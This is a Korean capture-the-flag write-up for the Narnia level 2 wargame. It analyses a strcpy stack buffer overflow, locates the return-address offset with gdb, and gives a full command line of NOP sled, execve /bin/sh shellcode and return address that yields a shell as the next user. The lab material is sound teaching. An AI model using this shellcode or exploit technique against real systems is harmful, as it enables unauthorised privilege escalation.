## 1. 문제 확인
- ID : narnia2
- Target : /narnia/narnia2
- Flag : /etc/narnia_pass/narnia3
```
narnia2@gibson:/narnia$ ./narnia2
Usage: ./narnia2 argument
narnia2@gibson:/narnia$ ./narnia2 aaa
aaanarnia2@gibson:/narnia$
```

<br/><br/>
## 2. 취약점 분석
### 2.1 Source Code
- 프로그램 실행 인자 값을 strcpy() 함수로 buf에 복사한 후 다시 buf를 출력함
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```
### 2.2 Code 분석
- buf 사이즈는 128byte이고, strcpy()로 복사할 때 사이즈 제한이 없으므로 128byte 이상 복사하면 buffer overflow가 발생
```
	char buf[128];

    ...
    strcpy(buf,argv[1]);
```

<br/><br/>
## 3. Exploit
- 프로그램 실행 인자값으로 140글자를 입력해보면 Segmentation fault 발생
```
	narnia2@gibson:/narnia$ ./narnia2 `echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"`
	Segmentation fault
	narnia2@gibson:/narnia$
```
- gdb로 실행하여 buf 사이즈 128byte에 추가로 12byte를 입력하여 오류가 발생되는 메모리 위치 확인해 보면, 0x43434343(CCCC) 에서 오류가 발생되었으므로 buf 위치로 부터 132byte 떨어진 위치에 리턴주소가 있음
```
	(gdb) r `echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD"`
	Starting program: /narnia/narnia2 `echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD"`
	Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
	[Thread debugging using libthread_db enabled]
	Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

	Program received signal SIGSEGV, Segmentation fault.
	0x43434343 in ?? ()
	(gdb)
```
- 오류발생 시점에 스택 메모리를 확인해보면 입력값이 0xffffd550 ~ 0xffffd5d0 에 위치
```
	(gdb) x/250x $esp
    ...
    0xffffd530:     0x00000000      0x00000000      0x00000000      0x2f000000
	0xffffd540:     0x6e72616e      0x6e2f6169      0x696e7261      0x41003261
	0xffffd550:     0x41414141      0x41414141      0x41414141      0x41414141
	0xffffd560:     0x41414141      0x41414141      0x41414141      0x41414141
	0xffffd570:     0x41414141      0x41414141      0x41414141      0x41414141
	0xffffd580:     0x41414141      0x41414141      0x41414141      0x41414141
	0xffffd590:     0x41414141      0x41414141      0x41414141      0x41414141
	0xffffd5a0:     0x41414141      0x41414141      0x41414141      0x41414141
	0xffffd5b0:     0x41414141      0x41414141      0x41414141      0x41414141
	0xffffd5c0:     0x41414141      0x41414141      0x41414141      0x42414141
	0xffffd5d0:     0x43424242      0x44434343      0x00444444      0x4c454853
	0xffffd5e0:     0x622f3d4c      0x622f6e69      0x00687361      0x3d445750
```
- 대략적인 위치(0xffffd570)를 리턴주소로 잡고, [NOP(0x90) + 쉘코드] 132byte + [리턴주소] 4byte 를 인자값으로 실행하면 쉘이 뜸
```
	narnia2@gibson:/narnia$ ./narnia2 `echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80\x70\xd5\xff\xff"`
	$ id
	uid=14003(narnia3) gid=14002(narnia2) groups=14002(narnia2)
	$
```
